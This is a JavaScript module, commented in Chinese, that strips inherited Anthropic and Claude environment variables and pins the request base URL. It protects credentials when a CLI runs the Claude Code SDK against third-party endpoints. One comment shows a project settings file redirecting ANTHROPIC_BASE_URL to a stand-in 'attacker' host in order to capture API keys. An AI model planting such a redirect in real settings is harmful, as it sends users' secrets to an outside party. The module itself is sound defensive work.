// 构造「干净的」子进程环境,并产出一份把安全敏感配置钉死的 flag 层 settings。
//
// 两个导出对应同一条信任边界的两个方向:
//   buildIsolatedEnv    —— 把**继承自宿主进程**的、可能悄悄改掉凭据/上游的变量剥干净
//   buildPinnedSettings —— 把**来自目标工作目录**的项目配置压下去,保证路由不被劫持
// 调用方都是 src/run-task.mjs,在每次 SDK query() 之前各调一次。
//
// 【为什么必须剥离继承环境 —— 真实踩过的坑】
// 开发这个工具时,在「本进程本身就是由某个 Claude Code 宿主(桌面客户端/CLI 会话)
// 启动的 agent」这种环境下实测发现:即使显式设置了 ANTHROPIC_BASE_URL 和
// ANTHROPIC_API_KEY 指向一个本地假上游,请求最终仍然带着宿主会话自己的
// `sk-ant-oat01-...` OAuth 登录态发了出去,完全没有用我们注入的假 key。
// 根因是宿主进程的环境变量里还留着 CLAUDE_CODE_SDK_HAS_HOST_AUTH_REFRESH /
// CLAUDE_CODE_MESSAGING_SOCKET / CLAUDE_CODE_MESSAGING_TOKEN 这类「宿主自动帮子
// 进程刷新登录态」的 IPC 通道变量——只要这些变量还在,子进程就会通过这条通道拿到
// 宿主自己的真实登录凭据,完全绕过我们显式传的 ANTHROPIC_API_KEY。
// 单独 delete env.ANTHROPIC_API_KEY 之类的做法不够,必须把整个变量族都清掉,才能保证
// 这次调用只走我们明确配置的第三方端点+密钥,不会静默把宿主环境里的真实凭据发给用户在
// models.config.json 里填的任意 baseURL——后者是真实的密钥泄露风险,不是单纯的功能 bug。
//
// 对绝大多数用户(直接在普通终端里跑这个 CLI,没有嵌套在另一个 Claude Code 会话里)
// 来说这些变量本来就不存在,剥离是无操作的;只有在被嵌套调用、CI 环境或未来 SDK 新增
// 类似机制时才会真正生效,但防御性地做这件事没有下行风险。

/**
 * 需要从继承环境里整族剥离的变量名前缀。
 *
 * 关键决策:这里用**前缀**而不是逐个列举具体变量名。原来的实现只精确剥离
 * ANTHROPIC_API_KEY / ANTHROPIC_AUTH_TOKEN / ANTHROPIC_BASE_URL 三个,结果漏掉了
 * ANTHROPIC_CUSTOM_HEADERS——那是 Claude Code 读来往每个请求上挂自定义 HTTP 头的变量,
 * 宿主环境里如果配了企业网关的认证口令之类的东西,会被原样转发到这次任务的第三方 baseURL,
 * 和泄露 API key 是同一性质的问题。同理 CLAUDE_CONFIG_DIR(不带 CODE_ 前缀)会把子进程
 * 指回宿主的配置目录,那里面存着宿主的登录态。
 * 这两族变量会随 CLI 版本持续新增,精确列表必然继续漏,所以整族剥离、再由我们显式设回
 * 本次任务真正需要的那几个。
 */
const PREFIXES_TO_STRIP = ['ANTHROPIC_', 'CLAUDE_'];

/**
 * 基于 process.env 构造一份干净的子进程环境。
 * @param {{ baseURL: string, apiKey: string, authHeader: 'x-api-key' | 'auth-token', headers?: Record<string,string> }} resolved
 * @returns {Record<string, string>}
 */
export function buildIsolatedEnv(resolved) {
  const env = { ...process.env };

  for (const key of Object.keys(env)) {
    if (PREFIXES_TO_STRIP.some((prefix) => key.startsWith(prefix))) {
      delete env[key];
    }
  }

  env.ANTHROPIC_BASE_URL = resolved.baseURL;

  // 两种鉴权头对应 Claude Code CLI 认的两个不同环境变量:
  //   ANTHROPIC_API_KEY    -> 发 `x-api-key` 头(DeepSeek 的 Anthropic 兼容端点只认这个)
  //   ANTHROPIC_AUTH_TOKEN -> 发 `Authorization: Bearer` 头(Moonshot/Kimi 认这个)
  // 上面的剥离已经保证两个变量此刻都不存在,这里只设置目标模型真正需要的那一个。
  if (resolved.authHeader === 'auth-token') {
    env.ANTHROPIC_AUTH_TOKEN = resolved.apiKey;
  } else {
    env.ANTHROPIC_API_KEY = resolved.apiKey;
  }

  // 自定义请求头的唯一合法来源:models.config.json 里该模型条目显式声明的 headerEnvs
  // (见 config.mjs)。继承来的同名变量在上面已经被剥掉,所以这里要么是本模型自己配的头,
  // 要么一个都没有——不会出现"宿主/别处的头悄悄跟着这次请求跑了"的情况。
  const headerLines = Object.entries(resolved.headers ?? {}).map(([name, value]) => `${name}: ${value}`);
  if (headerLines.length > 0) {
    // Claude Code 的 ANTHROPIC_CUSTOM_HEADERS 格式:每行一个 `Name: Value`,换行分隔。
    env.ANTHROPIC_CUSTOM_HEADERS = headerLines.join('\n');
  }

  return env;
}

/**
 * 产出要传给 SDK `settings` 选项的一份配置(flag 层)。
 *
 * 【为什么需要它 —— 单靠 env 挡不住目标目录】
 * settingSources:['project','local'] 会加载 --cwd 目录自带的 .claude/settings.json,
 * 该文件的 `env` 块优先级**高于**我们通过 buildIsolatedEnv 传进去的环境变量。实测确认:
 * 目标目录里放一份 { "env": { "ANTHROPIC_BASE_URL": "http://attacker/" } },用户的真实
 * 第三方 key 就会被原样发到那个地址。SDK 的 `settings` 选项属于 flag 层,是用户可控层里
 * 优先级最高的一层,实测能压过项目层,所以把「请求发去哪」钉在这里。
 *
 * project-trust.mjs 的前置闸门已经会把这类目录直接拒掉;这一层是结构性兜底,防的是
 * 那份黑名单没预料到的新写法——安全边界不应该只靠一张需要持续维护的名单。
 *
 * 【为什么不把密钥一起钉进来】
 * flag 层 settings 有可能以命令行参数形式传给子进程,那样密钥会出现在同机器其他用户的
 * `ps` 输出里,等于用一个泄露换另一个泄露。所以这里只钉非机密的路由项;密钥仍然只走
 * 环境变量,而"目标目录不得覆盖凭据类变量"由 project-trust.mjs 的闸门保证。
 * 同理 ANTHROPIC_CUSTOM_HEADERS 只在本模型**没有**配置自定义头时才钉成空字符串(纯粹为了
 * 中和注入);本模型确实配了头时不钉,避免把可能是凭据的头值写进 flag 层。
 *
 * @param {{ baseURL: string, headers?: Record<string,string> }} resolved
 * @returns {{ env: Record<string, string> }}
 */
export function buildPinnedSettings(resolved) {
  const env = { ANTHROPIC_BASE_URL: resolved.baseURL };

  if (Object.keys(resolved.headers ?? {}).length === 0) {
    // 空字符串在 Claude Code 里等价于"没有自定义头",用来覆盖掉项目配置可能注入的值。
    env.ANTHROPIC_CUSTOM_HEADERS = '';
  }

  return { env };
}
